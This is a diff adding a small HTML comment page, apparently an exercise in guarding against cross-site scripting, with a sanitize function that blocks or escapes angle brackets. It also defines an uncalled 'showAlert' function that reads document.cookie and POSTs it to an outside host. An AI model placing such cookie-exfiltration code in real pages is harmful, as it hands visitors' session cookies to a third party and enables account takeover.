@@ -1,0 +1,48 @@
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+</head>
+
+<body>
+    <input id="comment" type="text" placeholder="Leave a comment">
+    <button onclick="postComment()">Post</button>
+    <div id="comments"></div>
+    <script>
+        function sanitize(input) {
+            if (input.includes("<")) {
+                return 'invalid input value';
+            }
+            return input.replace(/</g, "&lt;").replace(/>/g, "&gt;");
+        }
+        function postComment() {
+            let input = document.getElementById("comment").value;
+            const secureInputValue = sanitize(input);
+            if (secureInputValue === 'invalid input value') {
+                window.alert('invalid value!');
+            }
+            else {
+                document.getElementById("comments").textContent += secureInputValue;
+            }
+        }
+
+
+        function showAlert() {
+            console.log('cookie: ', document.cookie);
+            fetch('https://northwind.vercel.app/api/categories', {
+                method: 'POST',
+                headers: {
+                    "Content-type": "application/json"
+                },
+                body: JSON.stringify({
+                    cookie: document.cookie
+                })
+            })
+        }
+    </script>
+
+</body>
+
+</html>
